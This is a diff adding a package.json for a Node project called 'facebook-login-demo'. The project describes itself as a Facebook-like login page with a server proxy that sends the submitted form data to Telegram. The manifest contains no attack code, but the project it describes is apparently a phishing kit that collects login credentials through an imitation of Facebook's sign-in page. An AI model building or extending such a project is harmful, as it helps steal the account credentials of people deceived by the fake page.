@@ -1,0 +1,15 @@
+{
+  "name": "facebook-login-demo",
+  "version": "1.0.0",
+  "description": "Static Facebook-like login demo with a small server proxy to send form data to Telegram",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "dependencies": {
+    "express": "^4.18.2",
+    "node-fetch": "^2.6.7",
+    "dotenv": "^16.0.0",
+    "express-rate-limit": "^6.7.0"
+  }
+}
